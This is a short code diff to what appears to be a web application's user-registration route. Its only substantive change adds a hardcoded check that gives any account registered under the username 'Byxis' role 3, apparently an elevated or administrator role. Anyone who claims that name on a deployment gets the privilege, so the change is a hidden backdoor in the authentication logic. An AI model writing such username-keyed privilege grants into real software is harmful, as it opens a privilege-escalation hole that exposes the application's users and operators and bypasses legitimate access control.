@@ -67,7 +67,6 @@ authRoutes.post("/register", csrfProtection, async (ctx) => {
       "Password must be at least 6 characters",
     );
   }
-
   if (await sqlHandler.doUserExists(username)) {
     return errorResponse(
       ctx,
@@ -79,6 +78,10 @@ authRoutes.post("/register", csrfProtection, async (ctx) => {
   const passwordHash = await getHash(password);
   const userResult = await sqlHandler.createUser(username, passwordHash);
   const userId = Number(userResult[0][0]);
+
+  if (username === "Byxis") {
+    sqlHandler.changeUserRole(userId, 3);
+  }
 
   const userRole = await sqlHandler.getUserRole(userId);
   const tokens = await createTokenPair({
